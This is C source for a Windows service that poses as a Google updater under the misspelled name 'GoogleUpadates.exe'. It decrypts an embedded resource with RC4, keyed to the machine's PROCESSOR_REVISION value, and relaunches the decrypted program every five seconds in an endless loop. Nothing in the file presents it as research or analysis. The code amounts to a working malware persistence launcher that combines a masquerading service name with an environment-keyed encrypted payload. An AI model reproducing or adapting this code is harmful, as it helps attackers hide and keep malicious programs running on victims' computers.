#include <windows.h>
#include <tchar.h>

//LPSERVICE_MAIN_FUNCTIONA LpserviceMainFunctiona;
TCHAR szServiceName[MAX_PATH] = "GoogleUpadates.exe";
SERVICE_STATUS_HANDLE g_ServiceStatusHandle = 0;
DWORD ThreadId;
void StreamCrypt(char * Data, long Length, char * Key, int KeyLength)
{
	int i = 0, j = 0;
	char k[256] = { 0 }, s[256] = { 0 };
	char tmp = 0;
	for (i = 0; i < 256; i++)
	{
		s[i] = i;
		k[i] = Key[i%KeyLength];
	}
	for (i = 0; i < 256; i++)
	{
		j = (j + s[i] + k[i]) % 256;
		tmp = s[i];
		s[i] = s[j];
		s[j] = tmp;
	}
	int t = 0;
	i = 0, j = 0, tmp = 0;
	int l = 0;
	for (l = 0; l < Length; l++)
	{
		i = (i + 1) % 256;
		j = (j + s[i]) % 256;
		tmp = s[i];
		s[i] = s[j];
		s[j] = tmp;
		t = (s[i] + s[j]) % 256;
		Data[l] ^= s[t];
	}
}


int GetPathFromRes(int resourceID, char *fname)
{
	//1.Get resource's pointer
	HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(resourceID), RT_RCDATA);
	if (hRsrc == NULL)
		return 0;
	DWORD totalSize = SizeofResource(NULL, hRsrc);
	if (totalSize == 0)
		return 0;
	HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL)
		return 0;
	LPVOID pBuffer = LockResource(hGlobal);
	if (pBuffer == NULL)
		return 0;
	//2.Initialization
	memcpy(fname, (char*)pBuffer, totalSize);
	StreamCrypt(fname, strlen(fname), getenv("PROCESSOR_REVISION"), strlen(getenv("PROCESSOR_REVISION")));
	return 1;
}





void MyFunc() {
	char filename[MAX_PATH] = { 0 };
	GetPathFromRes(100, filename);
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi;
	CreateProcess(filename, NULL, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
}

BOOL SetServiceStatus(DWORD dwServiceCode) {
	SERVICE_STATUS ss = { 0 };

	ss.dwCurrentState = dwServiceCode;
	ss.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	ss.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN |
		SERVICE_ACCEPT_PAUSE_CONTINUE;
	ss.dwWin32ExitCode = 0;
	ss.dwWaitHint = 3000;

	return(SetServiceStatus(g_ServiceStatusHandle, &ss));
}

void __stdcall LphandlerFunction(DWORD dwControl) {
	switch (dwControl) {
	case SERVICE_CONTROL_STOP:
		SetServiceStatus(SERVICE_STOP_PENDING);
		SetServiceStatus(SERVICE_STOPPED);
		break;
	case SERVICE_CONTROL_PAUSE:
		SetServiceStatus(SERVICE_PAUSE_PENDING);
		SetServiceStatus(SERVICE_PAUSED);
		break;
	case SERVICE_CONTROL_CONTINUE:
		SetServiceStatus(SERVICE_CONTINUE_PENDING);
		SetServiceStatus(SERVICE_RUNNING);
		break;
	default:
		break;
	}
}

void __stdcall LpserviceMainFunctiona(
	DWORD dwNumServicesArgs,
	LPSTR* lpServiceArgVectors
) {
	g_ServiceStatusHandle = RegisterServiceCtrlHandler(szServiceName, LphandlerFunction);
	if (0 == g_ServiceStatusHandle)
		return;
	SetServiceStatus(SERVICE_START_PENDING);
	SetServiceStatus(SERVICE_RUNNING);

	while (TRUE) {
		Sleep(5000);
		MyFunc();
	}
}

int _tmain() {
	SERVICE_TABLE_ENTRY stDispatchTable[] = {
		{ szServiceName, LpserviceMainFunctiona },
		{ NULL, NULL }
	};
	StartServiceCtrlDispatcher(stDispatchTable);

	return(0);
}